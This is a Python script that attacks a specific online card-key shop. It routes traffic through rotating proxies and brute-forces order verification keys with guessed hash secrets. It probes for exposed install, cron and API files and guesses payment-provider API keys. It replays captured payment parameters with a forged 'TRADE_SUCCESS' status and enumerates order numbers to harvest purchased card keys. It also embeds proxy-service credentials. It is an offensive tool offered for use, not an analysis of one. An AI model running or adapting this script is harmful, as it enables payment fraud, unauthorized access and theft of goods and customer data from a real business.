#!/usr/bin/env python3
"""hmjf.lol 另类路径深挖 alt2"""
import json, subprocess, os, hashlib, re, time

OUT = "/data/automation/results/hmjf.lol/kami_mine_20260716"
os.makedirs(OUT, exist_ok=True)

def lp():
    for l in open("/data/config/proxy.env"):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
B = "https://hmjf.lol/shop"
R = {"hits": [], "tests": {}}

def refresh():
    global PX
    subprocess.run(["bash", "/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = lp()
    time.sleep(1)

def curl(url, post=None, timeout=15):
    global PX
    c = ["curl", "-s", "--max-time", str(timeout), "-x", PX, "-A", UA, "-H", f"Referer: {REF}"]
    if post is not None:
        c += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    return subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""

def hit(tag, data):
    R["hits"].append({"via": tag, "data": data})
    print(f"HIT {tag}: {str(data)[:200]}", flush=True)

def save():
    json.dump(R, open(f"{OUT}/alt2.json", "w"), ensure_ascii=False, indent=2)

tn = "20260716025337303"

print("[1] alt skey", flush=True)
keys = ["", "hmjf", "xuxin", "datou111", "123456", "shua", "faka"]
for oid in range(1, 31):
    for k in keys:
        variants = [
            ("md5_idkid", hashlib.md5(f"{oid}{k}{oid}".encode()).hexdigest()),
            ("md5_id", hashlib.md5(str(oid).encode()).hexdigest()),
            ("md5_idk", hashlib.md5(f"{oid}{k}".encode()).hexdigest()),
            ("md5_kid", hashlib.md5(f"{k}{oid}".encode()).hexdigest()),
            ("md5_tn", hashlib.md5(tn.encode()).hexdigest()),
            ("md5_oid_tn", hashlib.md5(f"{oid}{tn}".encode()).hexdigest()),
            ("sha1_idkid", hashlib.sha1(f"{oid}{k}{oid}".encode()).hexdigest()),
        ]
        for name, sk in variants:
            h = curl(f"{B}/ajax.php?act=order", f"id={oid}&skey={sk}")
            if h and "验证失败" not in h:
                hit(f"skey_{name}", {"oid": oid, "k": k, "resp": h[:200]})
    if oid % 10 == 0:
        save()
save()

print("[2] mod=order id", flush=True)
for oid in [1, 2, 10, 100, 500, 1000, 5000, 10000, 13330, 13377]:
    h = curl(f"{B}/?mod=order&id={oid}")
    som = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", h)
    tnm = re.search(r'id="orderid"\s+value="(\d+)"', h)
    R["tests"][f"mod_id_{oid}"] = {
        "len": len(h), "trade": tnm.group(1) if tnm else None,
        "show": som.groups() if som else None,
    }
    if som:
        hit("mod_order", {"id": oid, "show": som.groups()})
save()

print("[3] paths", flush=True)
paths = [
    "install/", "install/install.lock", "cron.php", "cron.php?key=admin",
    "cron.php?key=hmjf", "cron.php?key=xuxin", "toollogs.php",
    "api.php", "api.php?act=order", "api.php?act=kami", "api.php?act=goods",
    "mini.php", "user/ajax_order.php", "other/download.php",
    "assets/faka/js/faka.js",
]
for p in paths:
    h = curl(f"{B}/{p}")
    R["tests"][p] = {"len": len(h), "snip": h[:120]}
    if any(x in h.lower() for x in ["kminfo", "install.lock", "database", "root:"]):
        hit("path", {"p": p, "snip": h[:200]})
save()

print("[4] ajax acts", flush=True)
acts = [
    "query", "order", "getorder", "kmquery", "cardquery", "fakaquery",
    "exportcard", "downcard", "getkm", "kmlist", "orderlist", "myorder",
    "buyok", "sendkm", "stockkm", "share_invitegift_link", "getshareid",
]
for act in acts:
    for post in [f"tid=72", f"type=1&qq={tn}", f"id=1&skey=1", f"trade_no={tn}"]:
        h = curl(f"{B}/ajax.php?act={act}", post)
        key = f"{act}_{post[:12]}"
        if h and len(h.strip()) > 2 and "No Act" not in h:
            R["tests"][key] = h[:150]
            if "kminfo" in h.lower():
                hit("ajax_" + act, h[:200])
save()

print("[5] getshop variants", flush=True)
for q in [f"trade_no={tn}", "id=1&skey=1", f"orderid={tn}", "format=json&trade_no=" + tn]:
    h = curl(f"{B}/other/getshop.php?{q}")
    R["tests"]["gs_" + q[:12]] = h[:120]
    if h and "kminfo" in h.lower():
        hit("getshop", {"q": q, "h": h[:200]})
save()

print("[6] epay key", flush=True)
for key in ["hmjf", "xuxin", "123456", "admin", "datou111", "666666", "ttwl66", "888888"]:
    h = curl(f"http://api.ttwl66.cn/api.php?act=order&pid=1003&key={key}&out_trade_no=20260716030008400")
    R["tests"]["epay_" + key] = h[:100]
    if h and "sign" not in h.lower() and '"code"' in h and "密钥" not in h:
        hit("epay", {"key": key, "h": h[:150]})
save()

print("[7] install + notify", flush=True)
h = curl(f"{B}/install/")
R["tests"]["install"] = h[:200]
if "install.lock" in h:
    hit("install_exposed", h[:150])
# epay notify with captured sign
sub = curl(f"{B}/other/submit.php?type=alipay&orderid=20260716030008400")
params = dict(re.findall(r'name="([^"]+)"\s+value="([^"]+)"', sub))
if params:
    qs = "&".join(f"{k}={v}" for k, v in params.items())
    for extra in ["", "&trade_status=TRADE_SUCCESS"]:
        n = curl(f"{B}/other/epay_notify.php?{qs}{extra}")
        gs = curl(f"{B}/other/getshop.php?trade_no=20260716030008400")
        R["tests"]["notify" + extra[:5]] = {"n": n[:60], "gs": gs[:80]}
save()

print("[8] dense 20260716031217", flush=True)
found = []
for s in range(0, 1000):
    tnf = f"20260716031217{s:03d}"
    sub = curl(f"{B}/other/submit.php?type=alipay&orderid={tnf}")
    if "window.location" not in sub or "该订单号不存在" in sub:
        continue
    gs = curl(f"{B}/other/getshop.php?trade_no={tnf}")
    qh = curl(f"{B}/?mod=query&data={tnf}")
    ent = {"tn": tnf, "gs": gs[:100]}
    found.append(ent)
    if "未付款" not in gs:
        hit("paid_gs", ent)
    som = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", qh)
    if som:
        hit("showorder", {"tn": tnf, "id": som.group(1), "skey": som.group(2)})
    if s % 100 == 0:
        print(f"  s={s} found={len(found)}", flush=True)
    time.sleep(0.1)
R["dense_found"] = found
save()

print("[9] query HTML phone", flush=True)
for data in ["13800138000", tn, "20260716030008400"]:
    h = curl(f"{B}/?mod=query&data={data}")
    if "没有查询到数据" not in h:
        hit("query_html", {"data": data, "len": len(h)})
        som = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", h)
        if som:
            oid, sk = som.groups()
            oj = curl(f"{B}/ajax.php?act=order", f"id={oid}&skey={sk}")
            if "kminfo" in oj.lower():
                hit("kminfo", {"data": data, "resp": oj[:300]})
save()

print(f"DONE hits={len(R['hits'])}", flush=True)
json.dump(R, open(f"{OUT}/alt2.json", "w"), ensure_ascii=False, indent=2)
